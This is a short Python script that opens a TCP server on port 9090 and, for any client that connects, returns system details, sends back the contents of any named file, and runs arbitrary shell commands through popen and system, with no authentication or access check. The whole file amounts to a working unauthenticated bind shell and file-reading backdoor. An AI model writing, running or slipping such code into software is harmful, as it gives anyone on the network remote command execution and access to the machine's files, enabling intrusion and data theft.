from os import popen, system, uname
import socket

# Open Server
sock = socket.socket()
try:
	sock.bind((socket.gethostbyname(socket.gethostname()), 9090))
except:
	raise SystemExit

# For one client
sock.listen(1)

while True:

	# Connect client
	try:
		conn, addr = sock.accept()
	except KeyboardInterrupt:
		print()
		raise SystemExit

	# Data from client
	data = ((conn.recv(1024)).decode()).split()

	# Close connect
	if not data:
		conn.close()

	# Service	
	else:
		# OUTPUT
		if data[0] in ['>', '->']:

			# Get info
			if data[1] in ['/i', '/I']:
				result = "".join([str(x) + ' ' for x in uname()])
			
			# Copy file
			elif data[1] in ['/c', '/C']:
				try:
					with open(data[2]) as file:
						result = file.read()
				except IndexError:
						result = "Error: name is False"
			
			# Get result from command
			else:
				result = "".join([x for x in popen(" ".join(data[1:]))])

			# Send result
			conn.send(result.encode())

		# INPUT
		elif data[0] in ['<', '<-']:
			system(" ".join(data[1:]))
